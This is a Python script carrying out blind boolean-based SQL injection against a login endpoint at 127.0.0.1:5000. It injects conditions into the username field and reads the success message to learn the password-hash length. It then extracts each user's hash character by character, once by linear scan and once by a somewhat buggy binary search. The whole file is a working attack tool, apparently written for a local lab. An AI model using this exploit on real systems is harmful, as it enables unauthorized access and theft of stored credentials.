import requests

total_queries = 0
charset = "0123456789abcdef"  # Hexadecimal characters for extracting password hashes
target = "http://127.0.0.1:5000/login"
needle = "Login successful"  # Success message from the server

# Function to send an injected SQL query
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content  # If the needle isn't found, it's considered a valid payload

# Function to perform a boolean-based SQL injection query
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select substr(password,{},1) from users where id = {}) {} '{}'".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if the user_id is valid
def invalid_user(user_id):
    payload = "(select id from users where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to find the length of the password hash
def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from users where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

# Function to extract the password hash
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# Function extracting hash using binary search

def extract_hash_bst(charset, user_id, password_length):
	found =""
	for index in range (0,user_password_length):
		start=0
		end=len(charset) - 1
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index,user_id, charset[start]):
					found += charset[start]
				else: 
					found += charset [start +1]

				break
			else: 
				middle = (start + end) //2
				if boolean_query(index,user_id, charset[middle]):
					end = middle
				else:
					start=middle
	return found


# Function to reset and print total queries made
def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0

# Main loop to interact with user input and execute the injection
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length :{}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] user {} hash:{}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
            print("\t[-t] User {} hash: {}".format (user_id,extract_hash_bst(charset,int(user_id),user_password_length)))
            total_queries_taken()
        else:
            print("\t [X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
